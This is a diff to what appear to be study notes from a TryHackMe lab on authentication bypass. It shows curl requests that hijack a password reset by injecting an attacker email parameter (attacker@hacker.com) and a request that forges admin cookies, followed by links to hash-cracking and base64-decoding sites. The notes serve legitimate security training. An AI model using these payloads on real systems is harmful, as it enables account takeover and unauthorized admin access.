@@ -8,3 +8,8 @@ Reset Password to different email
 user@tryhackme$ curl 'http://10.10.124.31/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
 
 user@tryhackme$ curl 'http://10.10.124.31/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+
+Cookies
+curl -H "Cookie: logged_in=true; admin=true" http://10.10.176.59/cookie-test
+https://crackstation.net
+https://www.base64decode.org
